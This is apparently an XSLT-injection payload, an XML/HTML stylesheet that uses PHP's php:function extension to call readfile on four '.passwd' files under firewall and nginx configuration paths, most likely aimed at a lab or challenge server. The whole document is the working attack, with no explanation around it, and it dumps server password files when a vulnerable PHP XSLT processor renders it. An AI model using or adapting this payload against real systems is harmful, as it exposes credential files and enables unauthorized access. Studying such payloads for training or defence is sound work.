<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','_firewall/.passwd')" />
<xsl:value-of select="php:function('readfile','-/.passwd')" />
<xsl:value-of select="php:function('readfile','_nginx.server-level.inc/.passwd')" />
<xsl:value-of select="php:function('readfile','_nginx.http-level.inc/.passwd')" />
</body>
</html>
